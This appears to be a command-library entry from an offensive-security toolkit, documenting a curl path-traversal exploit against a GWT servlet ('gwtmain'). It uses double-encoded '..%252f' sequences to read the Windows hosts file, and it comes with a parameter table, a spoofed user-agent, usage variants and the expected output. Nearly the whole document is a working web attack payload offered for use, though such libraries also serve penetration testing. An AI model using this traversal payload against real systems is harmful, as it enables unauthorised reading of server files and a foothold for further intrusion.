---
id: cmd-uuid-2
data: >-
  curl -X GET
  "https://target-domain/gwtmain//..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fwindows/System32/drivers/etc/hosts"
  -H "Host: target-domain" -H "Accept-Encoding: gzip, deflate" -H "Accept: */*"
  -H "Accept-Language: en" -H "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0;
  Windows NT 6.1; Win64; x64; Trident/5.0)" --connect-timeout 10 -v
tags:
  - path-traversal
  - lfi
type: command
output: null
executor: bash
platforms:
  - Web
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:19.926Z'
verified: false
validated: true
submitted: true
---
# curl-path-traversal-hosts

## Command

```bash
curl -X GET "https://target-domain/gwtmain//..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fwindows/System32/drivers/etc/hosts" -H "Host: target-domain" -H "Accept-Encoding: gzip, deflate" -H "Accept: */*" -H "Accept-Language: en" -H "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)" --connect-timeout 10 -v
```

## Description

Exploits path traversal to read the Windows hosts file via double-encoded sequences in the GWT servlet.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | HTTP GET method | Yes |
| `Path` | Traversal payload to hosts file | Yes |
| `-H "Host: ..."` | Target domain header | Yes |
| `-H "User-Agent: ..."` | Spoofed browser agent | Yes |
| `-v` | Verbose output for debugging | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://target-domain/gwtmain/[traversal]/hosts" -H "User-Agent: Mozilla/5.0"
```

### Advanced Usage

```bash
curl -X GET "https://target-domain/gwtmain/[traversal]/hosts" -H "User-Agent: Mozilla/5.0" --output hosts.txt
```

## Expected Output

200 OK with hosts file contents, e.g., "# Copyright (c) 1993-2009 Microsoft Corp." followed by IP mappings.

## Related

- [[Related Procedure: Exploit-Path-Traversal-for-POC-File-Read]]
